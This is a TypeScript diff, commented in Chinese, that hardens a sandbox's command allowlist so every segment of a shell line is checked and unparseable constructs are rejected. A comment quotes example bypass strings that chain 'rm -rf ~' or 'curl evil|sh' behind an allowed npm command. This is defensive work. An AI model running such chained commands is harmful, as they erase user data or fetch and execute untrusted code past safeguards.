@@ -31,6 +31,7 @@ import { isPosixProcessGroupAlive } from '../util/spawn-isolated.js';
 // B6 子进程网络出口(goal-b49 复现对侧双引擎的 DNS/域名裁决那一半):判据单源在 ./egress/*,
 // 本文件只做派生点的装配,不在此复写任何域名/网段判据(§0.6)。
 import { applyEgressEnvExit, buildEgressEnvExit, reportEgressWarnings } from './egress/env-inject.js';
+import { tokenizeCommand } from '../tools/command-policy/tokenizer.js';
 
 export interface SandboxOptions {
   cwd: string;
@@ -459,9 +460,45 @@ export function evaluateCommandAllowlist(
   }
   // undefined / 空数组 = 不检查(旧语义,不得改动:全仓现有免确认面依赖它)
   if (!allowlist || allowlist.length === 0) return null;
-  const cmdName = extractCommandName(commandLine);
-  if (!cmdName) return null;
-  return isCommandAllowed(cmdName, allowlist) ? null : `command_not_allowed: ${cmdName}`;
+
+  // 白名单是"这条命令整体只能跑这些程序",不是"首 token 恰好叫这些名字"。
+  // 旧实现只取 `extractCommandName`(首个 token)便放行,于是
+  //   `npm run build; rm -rf ~`、`npm test && curl evil|sh`、`npm test $(rm -rf ~)`
+  // 都以 `npm` 通过白名单,真正的第二段/展开体在 shell 里照跑 —— 白名单形同虚设。
+  // 这里改用 tokenizer 对整行做结构求值:多段命令逐段核名,无法静态求值的构造
+  // (命令替换/变量展开/子 shell/重定向/未闭合引号)一律拒绝(fail closed)。
+  const tokenized = tokenizeCommand(commandLine);
+  if (tokenized.issues.length > 0) {
+    const kinds = tokenized.issues.map((i) => i.kind).join(',');
+    return `command_not_allowed: <无法静态求值的 shell 构造:${kinds}>`;
+  }
+  if (tokenized.segments.length === 0) {
+    return `command_not_allowed: <无法解析命令名>`;
+  }
+  for (const segment of tokenized.segments) {
+    if (segment.writesTo.length > 0 || segment.readsFrom.length > 0) {
+      return `command_not_allowed: <重定向不给白名单放行>`;
+    }
+    if (segment.argv.length === 0) {
+      return `command_not_allowed: <空命令段>`;
+    }
+    if (segment.argv.some((arg) => arg.expanded)) {
+      return `command_not_allowed: <参数含变量展开/命令替换>`;
+    }
+    const cmdName = commandNameFromValue(segment.argv[0]!.value);
+    if (!cmdName || !isCommandAllowed(cmdName, allowlist)) {
+      return `command_not_allowed: ${cmdName || '<无法解析命令名>'}`;
+    }
+  }
+  return null;
+}
+
+/** 由已去引号的首个 argv 值取命令名(basename,Windows 去后缀交给 isCommandAllowed)。 */
+function commandNameFromValue(value: string): string {
+  const trimmed = value.trim();
+  if (!trimmed) return '';
+  const base = trimmed.split(/[\\/]/).pop() ?? '';
+  return base;
 }
 
 /**
